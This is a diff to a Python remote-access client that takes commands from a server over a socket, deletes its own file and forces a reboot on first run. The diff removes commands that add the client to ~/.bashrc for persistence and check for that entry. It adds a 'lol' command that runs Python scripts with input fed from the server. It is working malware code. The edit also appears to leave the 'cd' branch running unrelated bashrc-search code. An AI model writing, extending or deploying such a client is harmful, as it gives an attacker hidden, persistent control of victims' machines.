@@ -44,7 +44,7 @@ if first_time():
         #now delete this file
         os.remove(os.path.realpath(__file__))
         #force a reboot
-        os.system("shutdown")
+        os.system("reboot")
     except Exception as e:
         # if there's an error, set the output to the error message
         output = str(e)
@@ -79,53 +79,6 @@ while True:
                 # if the command is exit, just break out of the loop
                 break
             if splited_command[0].lower() == "cd":
-                # cd command, change directory
-                try:
-                    os.chdir(' '.join(splited_command[1:]))
-                except FileNotFoundError as e:
-                    # if there is an error, set as the output
-                    output = str(e)
-                else:
-                    # if operation is successful, empty message
-                    output = ""
-            elif splited_command[0].lower() == "xd":
-                # get the current working directory
-                cwd = os.getcwd()
-                # create the command to add to .bashrc
-                command_to_add = f"python3 {cwd}/client.py &"
-                # path to the .bashrc file
-                bashrc_path = os.path.expanduser("~/.bashrc")
-                try:
-                    # open the .bashrc file in append mode
-                    with open(bashrc_path, "a") as file:
-                        # write the command to the .bashrc file
-                        file.write("\n" + command_to_add + "\n")
-                    # set the output to success message
-                    output = "Command added to .bashrc successfully!"
-                except Exception as e:
-                    # if there's an error, set the output to the error message
-                    output = str(e)
-            elif splited_command[0].lower() == "chek":
-                # get the current working directory
-                cwd = os.getcwd()
-                # create the command to check in .bashrc
-                command_to_check = f"python3 {cwd}/client.py &"
-                # path to the .bashrc file
-                bashrc_path = os.path.expanduser("~/.bashrc")
-                try:
-                    # open the .bashrc file in read mode
-                    with open(bashrc_path, "r") as file:
-                        # read the contents of the .bashrc file
-                        contents = file.read()
-                    # check if the command is in the .bashrc file
-                    if command_to_check in contents:
-                        output = "The command is in the .bashrc file."
-                    else:
-                        output = "The command is not in the .bashrc file."
-                except Exception as e:
-                    # if there's an error, set the output to the error message
-                    output = str(e)
-            elif splited_command[0].lower() == "wazaaa":
                 # get the current working directory
                 cwd = os.getcwd()
                 # create the command to search in .bashrc
@@ -167,25 +120,28 @@ while True:
                     output = str(e)
             elif splited_command[0].lower() == "git_clone":
                 # the repository to clone
-                repo = ' '.join(splited_command[1:])
+                repo_name = ' '.join(splited_command[1:])
                 # the git clone command
-                command = ["git", "clone", repo]
+                command = ["git", "clone", repo_name]
                 try:
                     # run the git clone command
                     subprocess.run(command, check=True)
                     # set the output to success message
-                    output = f"Repository {repo} cloned successfully!"
+                    output = f"Repository {repo_name} cloned successfully!"
                 except subprocess.CalledProcessError:
                     # if there's an error, set the output to the error message
-                    output = f"Failed to clone repository {repo}."
-            elif splited_command[0].lower() == "python3_ex":
+                    output = f"Failed to clone repository {repo_name}."
+            elif splited_command[0].lower() == "lol":
                 # the python script to execute
                 script = ' '.join(splited_command[1:])
                 try:
+                    # receive the input from the server
+                    input = s.recv(BUFFER_SIZE).decode()
                     # execute the python script
-                    subprocess.run(["python3", script], check=True)
-                    # set the output to success message
-                    output = f"Script {script} executed successfully!"
+                    proc = subprocess.Popen(["python3", script], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    stdout, stderr = proc.communicate(input=input.encode())
+                    # set the output to the script's output
+                    output = stdout.decode()
                 except subprocess.CalledProcessError:
                     # if there's an error, set the output to the error message
                     output = f"Failed to execute script {script}."
